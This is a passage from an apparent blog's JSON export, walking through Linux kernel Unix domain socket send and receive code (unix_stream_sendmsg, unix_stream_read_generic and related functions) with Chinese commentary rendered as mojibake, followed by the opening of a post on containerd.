*from = msg.msg_iter; return res; } __sock_sendmsg()-\u0026gt;__sock_sendmsg()\nstatic int __sock_sendmsg(struct socket *sock, struct msghdr *msg) { int err = security_socket_sendmsg(sock, msg, msg_data_left(msg)); return err ?: sock_sendmsg_nosec(sock, msg); } __sock_sendmsg()-\u0026gt;sock_sendmsg_nosec()\nsock_sendmsg_nosec() æ˜¯ä¸€ä¸ªå†…æ ¸ä¸­çš„é™æ€å†…è”å‡½æ•°ï¼Œä¸»è¦ç”¨äºå‘é€æ¶ˆæ¯ï¼ˆsendmsgï¼‰çš„æ“ä½œã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å°†ç”¨æˆ·ç©ºé—´çš„æ¶ˆæ¯å°è£…åï¼Œé€šè¿‡è°ƒç”¨å¥—æ¥å­—åè®®çš„å‘é€å‡½æ•°ï¼Œå°†æ•°æ®å‘é€åˆ°ç›¸åº”çš„ç½‘ç»œæ ˆä¸­ã€‚\nstatic inline int sock_sendmsg_nosec(struct socket *sock, struct msghdr *msg) { // READ_ONCE(sock-\u0026gt;ops)-\u0026gt;sendmsgï¼šä½¿ç”¨ READ_ONCE è¯»å–å¥—æ¥å­—çš„æ“ä½œç»“æ„ä½“ï¼ˆsock-\u0026gt;opsï¼‰ä¸­çš„ sendmsg å‡½æ•°æŒ‡é’ˆï¼Œç¡®ä¿è¯»å–çš„åŸå­æ€§ã€‚sendmsg æ˜¯ä¸åŒåè®®çš„å®ç°å‡½æ•°ï¼Œè¿™é‡Œé€šè¿‡åŠ¨æ€åˆ¤æ–­åè®®ç±»å‹å¹¶è°ƒç”¨åˆé€‚çš„ sendmsg å‡½æ•°ï¼Œå…ˆè°ƒç”¨sock-\u0026gt;ops-\u0026gt;sendmsgï¼Œè‹¥ä¸ºç©ºï¼Œåˆ™ä¼šè°ƒç”¨IPv4 æˆ– IPv6 ã€‚ int ret = INDIRECT_CALL_INET(READ_ONCE(sock-\u0026gt;ops)-\u0026gt;sendmsg, inet6_sendmsg, inet_sendmsg, sock, msg, msg_data_left(msg)); BUG_ON(ret == -EIOCBQUEUED); if (trace_sock_send_length_enabled()) call_trace_sock_send_length(sock-\u0026gt;sk, ret, 0); return ret; } sock_sendmsg_nosec()-\u0026gt;unix_stream_sendmsg()\nunix_stream_sendmsg() æ˜¯ç”¨äº Unix åŸŸå¥—æ¥å­—çš„æ•°æ®å‘é€å‡½æ•°ï¼Œæ”¯æŒæµå¼ (SOCK_STREAM) å¥—æ¥å­—ã€‚å®ƒè´Ÿè´£å°†ç”¨æˆ·ç©ºé—´çš„æ•°æ®é€šè¿‡å¥—æ¥å­—å‘é€ç»™å·²è¿æ¥çš„å¦ä¸€ç«¯ã€‚\nstatic int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg, size_t len) { struct sock *sk = sock-\u0026gt;sk; struct sock *other = NULL; int err, size; struct sk_buff *skb; int sent = 0; struct scm_cookie scm; bool fds_sent = false; int data_len; // ç­‰å¾… Unix åƒåœ¾å›æ”¶å®Œæˆ wait_for_unix_gc(); // å¤„ç†æ§åˆ¶ä¿¡æ¯ err = scm_send(sock, msg, \u0026amp;scm, false); if (err \u0026lt; 0) return err; // ä¸æ”¯æŒ MSG_OOBï¼ˆå¸¦å¤–æ•°æ®ï¼‰ err = -EOPNOTSUPP; if (msg-\u0026gt;msg_flags \u0026amp; MSG_OOB) { #if IS_ENABLED(CONFIG_AF_UNIX_OOB) if (len) len--; else #endif goto out_err; } // éªŒè¯æ˜¯å¦æœ‰ç›®æ ‡è¿æ¥ if (msg-\u0026gt;msg_namelen) { err = sk-\u0026gt;sk_state == TCP_ESTABLISHED ? -EISCONN : -EOPNOTSUPP; goto out_err; } else { err = -ENOTCONN; other = unix_peer(sk); if (!other) goto out_err; } // æ£€æŸ¥å‘é€ç«¯æ˜¯å¦å·²ç»å…³é—­ if (sk-\u0026gt;sk_shutdown \u0026amp; SEND_SHUTDOWN) goto pipe_err; // å¾ªç¯å‘é€æ•°æ® while (sent \u0026lt; len) { size = len - sent; if (unlikely(msg-\u0026gt;msg_flags \u0026amp; MSG_SPLICE_PAGES)) { // ä½¿ç”¨ splice æ–¹æ³•åˆ†é…å‘é€ç¼“å†²åŒº skb = sock_alloc_send_pskb(sk, 0, 0, msg-\u0026gt;msg_flags \u0026amp; MSG_DONTWAIT, \u0026amp;err, 0); } else { // ä»¥å‘é€ç¼“å†²åŒºçš„ä¸€åŠå¤§å°ä¸ºæœ€å¤§å€¼ï¼Œé¿å…é˜»å¡ size = min_t(int, size, (sk-\u0026gt;sk_sndbuf \u0026gt;\u0026gt; 1) - 64); // é™åˆ¶ size ä»¥ä¿è¯å¯ä»¥è¿›è¡Œ order-0 åˆ†é… size = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ); data_len = max_t(int, 0, size - SKB_MAX_HEAD(0)); data_len = min_t(size_t, size, PAGE_ALIGN(data_len)); // åˆ†é…å‘é€ç¼“å†²åŒº skb = sock_alloc_send_pskb(sk, size - data_len, data_len, msg-\u0026gt;msg_flags \u0026amp; MSG_DONTWAIT, \u0026amp;err, get_order(UNIX_SKB_FRAGS_SZ)); } if (!skb) goto out_err; // å°†æ–‡ä»¶æè¿°ç¬¦ä»…åœ¨ç¬¬ä¸€ä¸ªç¼“å†²åŒºä¸­å‘é€ err = unix_scm_to_skb(\u0026amp;scm, skb, !fds_sent); if (err \u0026lt; 0) { kfree_skb(skb); goto out_err; } fds_sent = true; // ä½¿ç”¨ splice è¿›è¡Œæ•°æ®æ‹·è´ if (unlikely(msg-\u0026gt;msg_flags \u0026amp; MSG_SPLICE_PAGES)) { err = skb_splice_from_iter(skb, \u0026amp;msg-\u0026gt;msg_iter, size, sk-\u0026gt;sk_allocation); if (err \u0026lt; 0) { kfree_skb(skb); goto out_err; } size = err; refcount_add(size, \u0026amp;sk-\u0026gt;sk_wmem_alloc); } else { skb_put(skb, size - data_len); skb-\u0026gt;data_len = data_len; skb-\u0026gt;len = size; // å°†æ•°æ®ä»è¿­ä»£å™¨æ‹·è´åˆ°å‘é€ç¼“å†²åŒº err = skb_copy_datagram_from_iter(skb, 0, \u0026amp;msg-\u0026gt;msg_iter, size); if (err) { kfree_skb(skb); goto out_err; } } // é”ä½å¯¹ç«¯å¥—æ¥å­— unix_state_lock(other); // å¦‚æœå¯¹ç«¯å¥—æ¥å­—å·²å…³é—­ï¼Œè·³è½¬åˆ°é”™è¯¯å¤„ç† if (sock_flag(other, SOCK_DEAD) || (other-\u0026gt;sk_shutdown \u0026amp; RCV_SHUTDOWN)) goto pipe_err_free; // æ·»åŠ å‡­æ® maybe_add_creds(skb, sock, other); scm_stat_add(other, skb); // å°†æ•°æ®åŒ…åŠ å…¥åˆ°å¯¹ç«¯çš„æ¥æ”¶é˜Ÿåˆ— skb_queue_tail(\u0026amp;other-\u0026gt;sk_receive_queue, skb); unix_state_unlock(other); // é€šçŸ¥å¯¹ç«¯æœ‰æ–°æ•°æ® other-\u0026gt;sk_data_ready(other); sent += size; } #if IS_ENABLED(CONFIG_AF_UNIX_OOB) // å¤„ç†å¸¦å¤–æ•°æ® if (msg-\u0026gt;msg_flags \u0026amp; MSG_OOB) { err = queue_oob(sock, msg, other, \u0026amp;scm, fds_sent); if (err) goto out_err; sent++; } #endif // é”€æ¯æ§åˆ¶ä¿¡æ¯ scm_destroy(\u0026amp;scm); return sent; pipe_err_free: unix_state_unlock(other); kfree_skb(skb); pipe_err: // å¦‚æœå‘é€å¤±è´¥ï¼Œä¸”é MSG_NOSIGNALï¼Œåˆ™å‘é€ SIGPIPE ä¿¡å· if (sent == 0 \u0026amp;\u0026amp; !(msg-\u0026gt;msg_flags \u0026amp; MSG_NOSIGNAL)) send_sig(SIGPIPE, current, 0); err = -EPIPE; out_err: scm_destroy(\u0026amp;scm); return sent ? : err; } unix_stream_sendmsgå‡½æ•°ä¸­å°†å°†æ•°æ®ä»è¿­ä»£å™¨æ‹·è´åˆ°skbä¸­æœ‰ä¸¤ç§ä¸åŒçš„æ–¹æ³•ï¼šä½¿ç”¨spliceæ–¹æ³•(skb_splice_from_iter)å’Œæ™®é€šæ–¹æ³•(skb_copy_datagram_from_iter)\næ³¨ï¼šspliceæ–¹æ³•ä¼šåœ¨å¯ç”¨MSG_SPLICE_PAGESé€‰é¡¹æ—¶ä½¿ç”¨ã€‚\nè¿™é‡Œæˆ‘ä»¬ä»‹ç»æ™®é€šæ–¹æ³• skb_copy_datagram_from_iter()\nskb_copy_datagram_from_iter() æ˜¯ Linux å†…æ ¸ä¸­ç”¨äºå°†æ•°æ®ä» iov_iter è¿­ä»£å™¨å¤åˆ¶åˆ°å¥—æ¥å­—ç¼“å†²åŒº (sk_buff) ä¸­çš„å‡½æ•°ã€‚å®ƒç”¨äºå¤„ç†æ•°æ®çš„æ‹·è´è¿‡ç¨‹ï¼Œå°†ç”¨æˆ·ç©ºé—´æˆ–å†…æ ¸ä¸­çš„æ•°æ®ä¼ é€’åˆ° sk_buffï¼Œä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥çš„ç½‘ç»œä¼ è¾“æˆ–å¤„ç†ã€‚\nint skb_copy_datagram_from_iter(struct sk_buff *skb, int offset, struct iov_iter *from, int len) { int start = skb_headlen(skb); int i, copy = start - offset; struct sk_buff *frag_iter; /* Copy header. */ // é¦–å…ˆå°†å¤´éƒ¨æ•°æ®å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­ if (copy \u0026gt; 0) { if (copy \u0026gt; len) copy = len; if (copy_from_iter(skb-\u0026gt;data + offset, copy, from) != copy) goto fault; if ((len -= copy) == 0) return 0; offset += copy; } /* Copy paged appendix. Hmm... why does this look so complicated? */ // å¤„ç†é¡µç‰‡æ®µçš„æ•°æ®æ‹·è´ for (i = 0; i \u0026lt; skb_shinfo(skb)-\u0026gt;nr_frags; i++) { int end; const skb_frag_t *frag = \u0026amp;skb_shinfo(skb)-\u0026gt;frags[i]; WARN_ON(start \u0026gt; offset + len); end = start + skb_frag_size(frag); if ((copy = end - offset) \u0026gt; 0) { size_t copied; if (copy \u0026gt; len) copy = len; copied = copy_page_from_iter(skb_frag_page(frag), skb_frag_off(frag) + offset - start, copy, from); if (copied != copy) goto fault; if (!(len -= copy)) return 0; offset += copy; } start = end; } /* Copy data from skb fragments (e.g., GSO fragments) */ skb_walk_frags(skb, frag_iter) { int end; WARN_ON(start \u0026gt; offset + len); end = start + frag_iter-\u0026gt;len; if ((copy = end - offset) \u0026gt; 0) { if (copy \u0026gt; len) copy = len; if (skb_copy_datagram_from_iter(frag_iter, offset - start, from, copy)) goto fault; if ((len -= copy) == 0) return 0; offset += copy; } start = end; } if (!len) return 0; fault: return -EFAULT; } read() // syscall SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) { return ksys_read(fd, buf, count); } read()-\u0026gt;ksys_read()\nksys_read å‡½æ•°æ˜¯ Linux å†…æ ¸ä¸­ç”¨äºè¯»å–æ–‡ä»¶æè¿°ç¬¦å†…å®¹çš„å‡½æ•°ã€‚å®ƒçš„ç›®çš„æ˜¯ä»æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ (fd) ä¸­è¯»å–æ•°æ®åˆ°ç”¨æˆ·æä¾›çš„ç¼“å†²åŒº (buf) ä¸­ï¼Œå¹¶è¿”å›è¯»å–çš„å­—èŠ‚æ•°ã€‚\nssize_t ksys_read(unsigned int fd, char __user *buf, size_t count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; if (f.file) { loff_t pos, *ppos = file_ppos(f.file); if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } // è°ƒç”¨ vfs_read() å‡½æ•°æ‰§è¡Œå®é™…çš„æ–‡ä»¶è¯»å–æ“ä½œ ret = vfs_read(f.file, buf, count, ppos); if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; fdput_pos(f); } return ret; } ksys_read()-\u0026gt;vfs_read()\nvfs_read å‡½æ•°è´Ÿè´£ä»æ–‡ä»¶å¯¹è±¡è¯»å–æ•°æ®å¹¶å°†å…¶æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºä¸­ã€‚\nssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos) { ssize_t ret; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è¯» if (!(file-\u0026gt;f_mode \u0026amp; FMODE_READ)) return -EBADF; // æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å…è®¸è¯»å–æ“ä½œ if (!(file-\u0026gt;f_mode \u0026amp; FMODE_CAN_READ)) return -EINVAL; // æ£€æŸ¥ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºçš„æœ‰æ•ˆæ€§ if (unlikely(!access_ok(buf, count))) return -EFAULT; // è°ƒç”¨ rw_verify_area() éªŒè¯è¯»å–çš„åŒºåŸŸæ˜¯å¦åˆæ³•ï¼Œä¸»è¦ç”¨äºæ£€æŸ¥æ–‡ä»¶çš„åç§»é‡å’Œè¯»å–çš„å­—èŠ‚æ•°æ˜¯å¦è¶…å‡ºäº†æ–‡ä»¶è¾¹ç•Œã€‚ ret = rw_verify_area(READ, file, pos, count); if (ret) return ret; // é™åˆ¶è¯»å–å­—èŠ‚æ•° if (count \u0026gt; MAX_RW_COUNT) count = MAX_RW_COUNT; // æ‰§è¡Œè¯»å–æ“ä½œ,è¿™é‡Œä¼šè°ƒç”¨sock_read_iter if (file-\u0026gt;f_op-\u0026gt;read) //æ—§ ret = file-\u0026gt;f_op-\u0026gt;read(file, buf, count, pos); else if (file-\u0026gt;f_op-\u0026gt;read_iter) //æ–° ret = new_sync_read(file, buf, count, pos); else ret = -EINVAL; if (ret \u0026gt; 0) { // æ›´æ–°è¯»å–çš„ç»Ÿè®¡ä¿¡æ¯ fsnotify_access(file); add_rchar(current, ret); } inc_syscr(current); return ret; } vfs_read()-\u0026gt;sock_read_iter()\nsock_read_iter() æ˜¯ Linux å†…æ ¸ä¸­ç”¨äºå¤„ç†å¥—æ¥å­—è¯»å–æ“ä½œçš„å‡½æ•°ã€‚å®ƒç”¨äºä»å¥—æ¥å­—ä¸­è¯»å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®å†™å…¥ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºä¸­ã€‚è¿™ä¸ªå‡½æ•°åˆ©ç”¨ kiocb å’Œ iov_iter ç»“æ„æ¥æ”¯æŒå¼‚æ­¥å’Œå‘é‡åŒ–çš„ I/O æ“ä½œã€‚\nstatic ssize_t sock_read_iter(struct kiocb *iocb, struct iov_iter *to) { struct file *file = iocb-\u0026gt;ki_filp; struct socket *sock = file-\u0026gt;private_data; struct msghdr msg = {.msg_iter = *to, .msg_iocb = iocb}; ssize_t res; // å¦‚æœæ–‡ä»¶æ ‡å¿—åŒ…å« O_NONBLOCK æˆ– iocb ä¸­çš„æ ‡å¿—åŒ…å« IOCB_NOWAITï¼Œåˆ™è®¾ç½®éé˜»å¡æ ‡å¿— if (file-\u0026gt;f_flags \u0026amp; O_NONBLOCK || (iocb-\u0026gt;ki_flags \u0026amp; IOCB_NOWAIT)) msg.msg_flags = MSG_DONTWAIT; // ç¡®ä¿åç§»é‡ä¸º 0ï¼Œå› ä¸º socket ä¸èƒ½è¿›è¡Œåç§»è¯»å†™ if (iocb-\u0026gt;ki_pos != 0) return -ESPIPE; // å¦‚æœè¿­ä»£å™¨æ²¡æœ‰æ•°æ®éœ€è¦å†™å…¥ï¼Œç›´æ¥è¿”å› 0 if (!iov_iter_count(to)) /* Match SYS5 behaviour */ return 0; // è°ƒç”¨ sock_recvmsg æ¥æ¥æ”¶æ¶ˆæ¯ res = sock_recvmsg(sock, \u0026amp;msg, msg.msg_flags); // æ›´æ–°è¿­ä»£å™¨çš„çŠ¶æ€ *to = msg.msg_iter; return res; } sock_read_iter()-\u0026gt;sock_recvmsg()\nint sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags) { int err = security_socket_recvmsg(sock, msg, msg_data_left(msg), flags); return err ?: sock_recvmsg_nosec(sock, msg, flags); } sock_recvmsg()-\u0026gt;sock_recvmsg_nosec()\nstatic inline int sock_recvmsg_nosec(struct socket *sock, struct msghdr *msg, int flags) { int ret = INDIRECT_CALL_INET(READ_ONCE(sock-\u0026gt;ops)-\u0026gt;recvmsg, inet6_recvmsg, inet_recvmsg, sock, msg, msg_data_left(msg), flags); if (trace_sock_recv_length_enabled()) call_trace_sock_recv_length(sock-\u0026gt;sk, ret, flags); return ret; } sock_recvmsg_nosec()-\u0026gt;unix_stream_recvmsg()\nunix_stream_recvmsg() æ˜¯ Linux å†…æ ¸ä¸­å¤„ç† UNIX åŸŸå¥—æ¥å­—æµç±»å‹çš„æ¶ˆæ¯æ¥æ”¶å‡½æ•°ã€‚å®ƒä¸»è¦ç”¨äºä»æµå¼ UNIX åŸŸå¥—æ¥å­—ä¸­æ¥æ”¶æ•°æ®å¹¶å¡«å……åˆ° msghdr ç»“æ„ä¸­ã€‚\nstatic int unix_stream_recvmsg(struct socket *sock, struct msghdr *msg, size_t size, int flags) { struct unix_stream_read_state state = { .recv_actor = unix_stream_read_actor, .socket = sock, .msg = msg, .size = size, .flags = flags }; #ifdef CONFIG_BPF_SYSCALL struct sock *sk = sock-\u0026gt;sk; const struct proto *prot = READ_ONCE(sk-\u0026gt;sk_prot); // å¦‚æœå¥—æ¥å­—åè®®ä¸æ˜¯ UNIX åŸŸåè®®ï¼Œåˆ™è°ƒç”¨å…¶ä»–åè®®çš„ recvmsg æ–¹æ³• if (prot != \u0026amp;unix_stream_proto) return prot-\u0026gt;recvmsg(sk, msg, size, flags, NULL); #endif // è°ƒç”¨é€šç”¨çš„ UNIX æµè¯»å–å‡½æ•° return unix_stream_read_generic(\u0026amp;state, true); } unix_stream_recvmsg()-\u0026gt;unix_stream_read_generic()\nunix_stream_read_generic() æ˜¯ä¸€ä¸ªç”¨äºä» UNIX åŸŸå¥—æ¥å­—æµä¸­è¯»å–æ•°æ®çš„å‡½æ•°ã€‚å®ƒç®¡ç†ä»å†…æ ¸ä¸­çš„å¥—æ¥å­—ç¼“å†²åŒº (sk_buff) ä¸­è¯»å–æ•°æ®çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œå¹¶å¤„ç†å¤šä¸ªå¤æ‚åœºæ™¯ï¼ŒåŒ…æ‹¬éé˜»å¡è¯»å–ã€æ¥æ”¶å¤–å¸¦æ•°æ®ï¼ˆOOBï¼‰ã€ç­‰å¾…æ•°æ®å¯ç”¨ç­‰ã€‚\nstatic int unix_stream_read_generic(struct unix_stream_read_state *state, bool freezable) { struct scm_cookie scm; struct socket *sock = state-\u0026gt;socket; struct sock *sk = sock-\u0026gt;sk; struct unix_sock *u = unix_sk(sk); int copied = 0; int flags = state-\u0026gt;flags; int noblock = flags \u0026amp; MSG_DONTWAIT; bool check_creds = false; int target; int err = 0; long timeo; int skip; size_t size = state-\u0026gt;size; unsigned int last_len; if (unlikely(sk-\u0026gt;sk_state != TCP_ESTABLISHED)) { err = -EINVAL; goto out; } if (unlikely(flags \u0026amp; MSG_OOB)) { err = -EOPNOTSUPP; #if IS_ENABLED(CONFIG_AF_UNIX_OOB) err = unix_stream_recv_urg(state); #endif goto out; } // è·å– socket è¯»å–çš„ä½æ°´ä½æ ‡è®° target = sock_rcvlowat(sk, flags \u0026amp; MSG_WAITALL, size); timeo = sock_rcvtimeo(sk, noblock); memset(\u0026amp;scm, 0, sizeof(scm)); // åŠ é”ä»¥é˜²æ­¢åœ¨è¯»å–è¿‡ç¨‹ä¸­å‘ç”Ÿé˜Ÿåˆ—æ··ä¹± mutex_lock(\u0026amp;u-\u0026gt;iolock); skip = max(sk_peek_offset(sk, flags), 0); do { int chunk; bool drop_skb; struct sk_buff *skb, *last; redo: // é”å®šå¥—æ¥å­—çš„çŠ¶æ€ä»¥è¿›è¡Œå®‰å…¨çš„æ•°æ®è¯»å– unix_state_lock(sk); if (sock_flag(sk, SOCK_DEAD)) { err = -ECONNRESET; goto unlock; } last = skb = skb_peek(\u0026amp;sk-\u0026gt;sk_receive_queue); last_len = last ? last-\u0026gt;len : 0; #if IS_ENABLED(CONFIG_AF_UNIX_OOB) if (skb) { skb = manage_oob(skb, sk, flags, copied); if (!skb) { unix_state_unlock(sk); if (copied) break; goto redo; } } #endif again: if (skb == NULL) { if (copied \u0026gt;= target) goto unlock; // æ£€æŸ¥ socket é”™è¯¯ err = sock_error(sk); if (err) goto unlock; // æ£€æŸ¥æ¥æ”¶ç«¯å…³é—­ if (sk-\u0026gt;sk_shutdown \u0026amp; RCV_SHUTDOWN) goto unlock; unix_state_unlock(sk); if (!timeo) { err = -EAGAIN; break; } mutex_unlock(\u0026amp;u-\u0026gt;iolock); // ç­‰å¾…æ•°æ®åˆ°æ¥ timeo = unix_stream_data_wait(sk, timeo, last, last_len, freezable); if (signal_pending(current)) { err = sock_intr_errno(timeo); scm_destroy(\u0026amp;scm); goto out; } mutex_lock(\u0026amp;u-\u0026gt;iolock); goto redo; unlock: unix_state_unlock(sk); break; } // å¾ªç¯å¤„ç† sk_buff æ•°æ®ï¼Œæ‰¾åˆ°è¦å¼€å§‹è¯»å–çš„ skbï¼Œå¹¶è·³è¿‡å·²è¢«è¯»å–çš„æ•°æ®ã€‚skip æ˜¯éœ€è¦è·³è¿‡çš„æ•°æ®å­—èŠ‚æ•°ï¼Œå®ƒé€šè¿‡ä¸æ¯ä¸ª skb çš„é•¿åº¦æ¯”è¾ƒï¼Œå†³å®šæ˜¯å¦éœ€è¦è·³è¿‡å½“å‰çš„ skbï¼Œç›´åˆ°æ‰¾åˆ°éœ€è¦è¯»å–çš„ skbã€‚ while (skip \u0026gt;= unix_skb_len(skb)) { skip -= unix_skb_len(skb); last = skb; last_len = skb-\u0026gt;len; skb = skb_peek_next(skb, \u0026amp;sk-\u0026gt;sk_receive_queue); if (!skb) goto again; } unix_state_unlock(sk); // æ£€æŸ¥å¹¶è®¾ç½®æ¶ˆæ¯å‘é€è€…çš„å‡­æ® if (check_creds) { if (!unix_skb_scm_eq(skb, \u0026amp;scm)) break; } else if (test_bit(SOCK_PASSCRED, \u0026amp;sock-\u0026gt;flags) || test_bit(SOCK_PASSPIDFD, \u0026amp;sock-\u0026gt;flags)) { scm_set_cred(\u0026amp;scm, UNIXCB(skb).pid, UNIXCB(skb).uid, UNIXCB(skb).gid); unix_set_secdata(\u0026amp;scm, skb); check_creds = true; } // å°†åœ°å€ä¿¡æ¯å¤åˆ¶åˆ°æ¶ˆæ¯ä¸­ if (state-\u0026gt;msg \u0026amp;\u0026amp; state-\u0026gt;msg-\u0026gt;msg_name) { DECLARE_SOCKADDR(struct sockaddr_un *, sunaddr, state-\u0026gt;msg-\u0026gt;msg_name); unix_copy_addr(state-\u0026gt;msg, skb-\u0026gt;sk); sunaddr = NULL; } // ç¡®å®šæœ¬æ¬¡è¦è¯»å–çš„æ•°æ®é‡ chunk = min_t(unsigned int, unix_skb_len(skb) - skip, size); skb_get(skb); // recv_actor æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œç”¨äºå°†æ•°æ®ä» sk_buff å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´çš„ç¼“å†²åŒºä¸­ã€‚ // recv_actor ä¼šè¯»å–ä»åç§»é‡ skip å¼€å§‹çš„ chunk å­—èŠ‚çš„æ•°æ®åˆ°æŒ‡å®šçš„ç¼“å†²åŒºï¼Œé€šå¸¸ç”± unix_stream_read_actor æŒ‡å‘çš„å‡½æ•°æ¥å®Œæˆã€‚ chunk = state-\u0026gt;recv_actor(skb, skip, chunk, state); drop_skb = !unix_skb_len(skb); consume_skb(skb); if (chunk \u0026lt; 0) { if (copied == 0) copied = -EFAULT; break; } copied += chunk; size -= chunk; if (drop_skb) { err = 0; break; } // æ ‡è®°è¢«è¯»å–çš„éƒ¨åˆ†ï¼Œå°†å·²è¯»å–çš„æ•°æ®ä»ç¼“å†²åŒºä¸­æ ‡è®°ä¸ºå·²æ¶ˆè´¹ï¼Œå¹¶è°ƒæ•´åç§»é‡ï¼Œå¦‚æœè¯»å–å®Œæ¯•åˆ™å°† skb ä»é˜Ÿåˆ—ä¸­ç§»é™¤å¹¶é‡Šæ”¾ã€‚ if (!(flags \u0026amp; MSG_PEEK)) { UNIXCB(skb).consumed += chunk; sk_peek_offset_bwd(sk, chunk); if (UNIXCB(skb).fp) { scm_stat_del(sk, skb); unix_detach_fds(\u0026amp;scm, skb); } if (unix_skb_len(skb)) break; skb_unlink(skb, \u0026amp;sk-\u0026gt;sk_receive_queue); consume_skb(skb); if (scm.fp) break; } else { if (UNIXCB(skb).fp) unix_peek_fds(\u0026amp;scm, skb); sk_peek_offset_fwd(sk, chunk); if (UNIXCB(skb).fp) break; skip = 0; last = skb; last_len = skb-\u0026gt;len; unix_state_lock(sk); skb = skb_peek_next(skb, \u0026amp;sk-\u0026gt;sk_receive_queue); if (skb) goto again; unix_state_unlock(sk); break; } } while (size); mutex_unlock(\u0026amp;u-\u0026gt;iolock); if (state-\u0026gt;msg) scm_recv_unix(sock, state-\u0026gt;msg, \u0026amp;scm, flags); else scm_destroy(\u0026amp;scm); out: return copied ? : err; } å‡ ä¸ªå¥—æ¥å­—ç»“æ„ä¹‹é—´çš„åŒºåˆ«å¦‚ä¸‹è¡¨æ‰€ç¤º\nåç§° ç±»å‹ ä½ç½® ä¸»è¦åŠŸèƒ½ socket ç”¨æˆ·ç©ºé—´ç»“æ„ ç”¨æˆ·ç©ºé—´ ç”±åº”ç”¨ç¨‹åºåˆ›å»ºå’Œæ“ä½œçš„ç½‘ç»œå¥—æ¥å­—æ¥å£ï¼Œæä¾›å¯¹å¤–é€šä¿¡åŠŸèƒ½ã€‚ sock å†…æ ¸ç©ºé—´ç»“æ„ å†…æ ¸ç©ºé—´ å†…æ ¸ä¸­çš„å¥—æ¥å­—è¡¨ç¤ºï¼Œå°è£…å…·ä½“åè®®æ ˆçš„å®ç°ï¼Œè´Ÿè´£ç®¡ç†ç½‘ç»œè¿æ¥å’Œæ•°æ®ä¼ è¾“ã€‚ unix_sock å†…æ ¸ç©ºé—´ç»“æ„ï¼ˆsockçš„å­ç±»ï¼‰ å†…æ ¸ç©ºé—´ ä¸“ç”¨äº Unix åŸŸå¥—æ¥å­—ï¼Œå­˜å‚¨ç‰¹å®šäº Unix åŸŸå¥—æ¥å­—çš„æ•°æ®ï¼ˆå¦‚è·¯å¾„ã€åœ°å€ç­‰ï¼‰ã€‚ ","date":"2024-12-15T00:00:00Z","image":"https://image.chenyuan1125.top/uds.jpg","permalink":"https://chenyuan1125.github.io/p/unix-domain-socket%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90olk-6.6/","title":"Unix Domain Socketæºç å®ç°åˆ†æ(OLK 6.6)"},{"content":"containerdé€šä¿¡æœºåˆ¶ ç®€è¿° Containerd æ˜¯ä¸€ä¸ªäº‘åŸç”Ÿï¼ˆå®¹å™¨ï¼‰é¢†åŸŸè¡Œä¸šæ ‡å‡†å®¹å™¨è¿è¡Œæ—¶ã€‚ä»¥æ“ä½œç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹æ–¹å¼æä¾›æœåŠ¡ï¼Œç®¡ç†ä¸€å°æœºå™¨ä¸Šæ¯ä¸ªå®¹å™¨ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬ï¼š\né•œåƒä¸‹è½½å’Œå­˜å‚¨ã€‚ å®¹å™¨ rootfs ï¼ˆæ ¹æ–‡ä»¶ç³»ç»Ÿï¼‰çš„ç”Ÿæˆã€‚ å®¹å™¨çš„å¯åŠ¨å’Œå®ˆæŠ¤ã€‚ å®¹å™¨çš„ä½çº§å­˜å‚¨å’Œé™„åŠ ç½‘ç»œã€‚ Containerd æ˜¯ CNCF æ¯•ä¸šé¡¹ç›®ï¼Œæ˜¯ Kubernetes å’Œ Docker çš„é»˜è®¤å®¹å™¨è¿è¡Œæ—¶ã€‚\nContainerd å®ˆæŠ¤è¿›ç¨‹é»˜è®¤æä¾›äº†ä¸¤å¥— APIï¼š\nContainerd åŸç”Ÿ GRPC API ï¼ˆæºç ï¼‰ï¼Œå¹¶æä¾›äº† Go SDK ï¼ˆå‚è§ï¼šæºç ï¼‰ï¼ŒDocker ä»¥è¯¥æ–¹å¼é›†æˆ Containerdã€‚ Kubernetes çš„ CRI GRPC APIï¼ˆæºç ï¼‰ï¼Œå½¢æ€ä¸Šé€šè¿‡ Containerd Plugin çš„æ–¹å¼æä¾›æœåŠ¡ï¼ˆåŸç”Ÿæ’ä»¶ï¼Œæ‰“åŒ…åˆ°äº† Containerd äºŒè¿›åˆ¶ä¸­ï¼‰ï¼Œæ¶æ„å‚è§ï¼šdocsã€‚Kubernetes ä»¥è¯¥æ–¹å¼é›†æˆ Containerdã€‚ åœ¨åº•å±‚å®¹å™¨è¿è¡Œæ—¶æ–¹é¢ï¼ŒContainerd é‡‡ç”¨ OCI-runtime æ ‡å‡†ï¼Œé»˜è®¤ä½¿ç”¨ runc ä½œä¸ºè¿è¡Œæ—¶ã€‚\nç®€å•æ¦‚è¿°å…¸å‹åœºæ™¯ä¸­ Kubernetesã€Containerdã€Runc çš„ å±‚çº§å…³ç³»å¦‚ä¸‹ï¼š\nKubernetes è´Ÿè´£é›†ç¾¤ï¼ˆå¤šèŠ‚ç‚¹ï¼‰çš„è°ƒåº¦å’Œç®¡ç†ï¼Œåœ¨å•ä¸ªèŠ‚ç‚¹ï¼Œé€šè¿‡ Kubelet ç»„ä»¶é€šè¿‡ CRI GRPC æ¥å£è°ƒç”¨ 